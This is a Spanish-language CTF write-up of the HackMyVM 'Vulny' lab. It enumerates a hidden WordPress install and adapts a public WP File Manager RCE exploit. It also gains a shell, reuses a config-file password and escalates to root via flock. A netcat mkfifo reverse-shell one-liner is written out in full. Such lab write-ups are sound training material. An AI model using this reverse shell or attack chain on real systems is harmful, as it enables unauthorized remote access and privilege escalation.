+++
title = 'Vulny'
date = 2024-01-20T14:47:53-06:00
draft = false
summary = "Writeup of the machine vulny from the hackmyvm website"
tags = ["pentesting","hackmyvm","sql","wordpress","python"]
series=['Hackmyvm Easy']
series_order=1
+++

# Información de la maquína
***
| Nombre  | Vulny  |
|---|---|
|  Sistema operativo | Linux  |
|Autor   |SML   |
|Dificultad   |Fácil   |
|Sitio   |[hackmyvm](https://hackmyvm.eu)   |
***


## Reconocimiento y enumeración

Escaneo de servicios:

![](images/vulny%20(1).png)

Revisemos la página web:

![](images/vulny%20(2).png)

Página predeterminada de apache2. Corremos nuestro escaneo de gobuster.

![](images/vulny%20(3).png)

Encontramos dos directorios interesantes, javascript y secret. Revisemos ambos:

![](images/vulny%20(4).png)

Encontramos algo interesante, tal vez, estamos en ese directorio ahorita mismo, entonces tengamos eso en cuenta. En el directorio javascript no tenemos los privilegios para ver los contenidos:

![](images/vulny%20(5).png)

Enumeremos el directorio `/secret`:

![](images/vulny%20(6).png)

Encontramos otros 3 directorios, revisemos cada uno de ellos:

![](images/vulny%20(7).png)

***
![](images/vulny%20(8).png)

![](images/vulny%20(9).png)

*Después, encontré está lista de directorios en el directorio /wp-admin, pero no podía acceder*
***

![](images/vulny%20(10).png)

Revisemos el directorio `/uploads` que esta en `wp-content`:

![](images/vulny%20(11).png)

Encontramos un archivo zip, lo descargamos para ver sus contenidos:

![](images/vulny%20(12).png)

En los contenidos del archivo, hay un archivo con extensión `.sql`, investigamos como abrirlo:

![](images/vulny%20(13).png)
![](images/vulny%20(14).png)

Seguimos estos pasos. Y no encontramos nada de interés en las tablas contenidas en la base de datos (se tiene que iniciar el servicio de mysql con el siguiente comando `sudo service start mysql`):

![](images/vulny%20(15).png)

Parece ser que, esta base de datos no contiene información; idealmente, debería contener usuario y contraseñas. Decido investigar un poco más acerca del `wp file manager` y su versión a ver si podemos explotarlo de alguna manera.

Después de un rato, encontré esta página de [github](https://github.com/ircashem/wp-file-manager-plugin-exploit), que contiene un exploit para esta aplicación. Es un plugin de wordpress, y este exploit nos permitirá hacer remote command execution. Ahora sigo los pasos para ver si conseguimos obtener una reverse shell:

Recibo un error:

![](images/vulny%20(16).png)

Revisemos el código para encontrar el problema:

![](images/vulny%20(17).png)

Como podemos ver, el directorio predeterminado es `/wp-content`, pero, recordemos nuestra enumeración de directorios, el directorio `/wp-content` está dentro del directorio `/secret`:

![](images/vulny%20(18).png)

También, solo para salir de la duda, revisemos los contenidos del archivo zip que descargamos para ver si el archivo `readme.txt` está ahí:

![](images/vulny%20(19).png)

Ahí está, entonces, ahora, para que este código funcione, añadimos el string `/secret` a la variable, así:

![](images/vulny%20(20).png)

Debería funcionar ahora, probemos:

![](images/vulny%20(21).png)

Encontramos otro error, pero esta vez, en mi opinión, de parte del programador, ¿La versión 6.0 también era vulnerable, verdad?

![](images/vulny%20(22).png)

Lo es, revisemos el codigo otra vez:

![](images/vulny%20(23).png)

Encontramos el problema, bien, lo que está pasando aquí, de manera muy resumida, el operador `>` *mayor que* es el que está causando el problema. Debido a esto, en vez de confirmar las versiones `6.0 a 6.8` solo confirmará las versiones `6.1 a 6.8` como vulnerables. Dejando la versión `6.0` del rango del script, añadimos el operador `=` al lado del `>`, para que tome en cuenta el `6.0`. Probamos el código otra vez:

![](images/vulny%20(24).png)

Después de analizar el código otra vez, me di cuenta de que, hay otras strings referenciando al directorio, que no cambié:

![](images/vulny%20(25).png)

## Acceso inicial y cambio de usuario
Corramos el exploit otra vez:

![](images/vulny%20(26).png)

¡Ahí está! Miremos qué podemos encontrar:

![](images/vulny%20(27).png)

Primero, encontramos al usuario adrian, revisemos si podemos acceder su carpeta `home`. Para ser que no podemos recorrer directorios, intentemos esa reverse shell que vimos en la página de github del exploit:

Iniciamos nuestro escucha de netcat primero:

![](images/vulny%20(28).png)

Y luego corremos el comando `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP-DE-TU-MAQUINA> <PUERTO-A-ELECCION> >/tmp/f ` en la máquina objetivo:

![](images/vulny%20(29).png)


![](images/vulny%20(30).png)
¡Obtenemos una reverse shell! Mejoremos nuestra sesión un poco:

![](images/vulny%20(31).png)

Cuando usemos lo siguiente, recordemos que tenemos que correr una `bash shell` para que esto funcione, lo cual, en mi caso, necesito hacer porque estoy usando zsh. Corro el comando y exploro. Primero, busco a otros usuarios:

![](images/vulny%20(32).png)

Además de root, solo el usuario *adrian* tiene permitido una sesión de shell. Vamos a su directorio home para ver si podemos accederlo:

![](images/vulny%20(33).png)

No podemos acceder nada interesante debido a la falta de privilegios, pero sabemos que tenemos que cambiar a este usuario. Revisemos si hay algo de interés en el directorio `/var/www/`:

![](images/vulny%20(34).png)

Nada...

Decido explorar los contenidos de la carpeta de wordpress, y encuentro algunos archivos interesantes ahí:

![](images/vulny%20(35).png)

Reviso los contenidos de ese archivo php:

![](images/vulny%20(36).png)

(*¿Tal vez esa es la contraseña del usuario adrian?*) Intentamos logearnos como adrian:

![](images/vulny%20(37).png)

¡Bien! Obtengamos la bandera de usuario:

![](images/vulny%20(38).png)

## Escalado de privilegios
Ahora, corramos los comandos usuales para ver si encontramos algun vector de escalado de privilegios:

![](images/vulny%20(39).png)

Buscamos ese programa en [gtfobins](https://gtfobins.github.io/gtfobins/flock/)

![](images/vulny%20(40).png)

Intentamos esto, and vemos si podemos acceders los contenidos del directorio `/root`:

![](images/vulny%20(41).png)

¡Mucho mejor, obtenemos privilegios de administrador! Miremos si podemos obtener la bandera de root:

![](images/vulny%20(42).png)

Y con esto hemos comprometido la maquina.

## Cosas que aprendí sobre esta máquina

- Vulnerabilidad de worpress en las siguientes versiones (6.0 to 6.8).
- Cómo acceder a una base de datos que descargué con mysql(y que no siempre estas bases de datos tendrán información dentro de ellas...).
- Recordar iniciar una bash shell cuando estamos mejorando a full TTY en el escucha de netcat(en el caso de que bash no sea nuestra shell predeterminada).
- Revisar los archivos de configuración para ver sé si encuentra información interesante.
- Aparentemente, después de revisar otros writeups, también podría haber usado metasploit para resolver esta máquina.